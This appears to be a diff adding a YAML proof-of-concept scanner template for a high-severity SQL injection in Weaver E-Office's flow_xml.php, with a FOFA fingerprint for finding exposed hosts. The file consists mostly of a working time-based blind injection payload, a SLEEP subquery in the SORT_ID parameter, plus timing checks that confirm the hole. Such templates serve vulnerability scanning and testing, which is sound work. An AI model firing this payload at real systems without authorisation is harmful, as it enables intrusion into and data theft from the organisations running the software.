@@ -1,0 +1,27 @@
+id: poc-yaml-weaver-e-office-flow-xml-sqli
+info:
+  name: 泛微E-Office flow_xml.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: E-cology
+  fofa: app="泛微-EOffice"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /general/system/workflow/flow_type/flow_xml.php?SORT_ID=1+AND+(SELECT+2329+FROM+(SELECT(SLEEP({{.t1}})))URgU)
+  expression: 'status_code == 200 &&
+
+    contains(body,"<?xml version=\"1.0\"?>") &&
+
+    contains(body,"<tree>") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
